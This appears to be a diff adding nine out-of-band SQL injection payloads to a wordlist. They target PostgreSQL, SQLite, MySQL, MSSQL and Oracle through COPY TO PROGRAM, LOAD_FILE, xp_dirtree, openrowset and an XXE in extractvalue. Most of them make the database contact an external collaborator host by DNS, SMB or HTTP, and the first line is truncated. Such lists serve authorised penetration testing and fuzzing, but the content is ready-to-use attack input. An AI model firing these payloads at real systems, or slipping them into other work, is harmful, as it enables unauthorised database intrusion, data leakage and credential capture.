@@ -1,0 +1,9 @@
+opy (select '') to program 'nslookup sqlipoc.collabxyz.net' 
+;attach database '//sqlipoc.collabxyz.net/z' as 'z'-- - 
+(SELECT load_extension('//foo')) 
+LOAD_FILE('\\\\sqlipoc.collabxyz.net\\foo') 
+SELECT … INTO OUTFILE '\\\\sqlipoc.collabxyz.net\foo' 
+SELECT * FROM openrowset('SQLNCLI', 'sqlipoc.collabxyz.net';'a', 'select 1 from dual') 
+EXEC master.dbo.xp_fileexist '\\\\sqlipoc.collabxyz.net\\foo'
+EXEC master.dbo.xp_dirtree '\\\\sqlipoc.collabxyz.net\\foo' 
+SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sqlipoc.collabxyz.net/"> %remote;]>'),'/l')
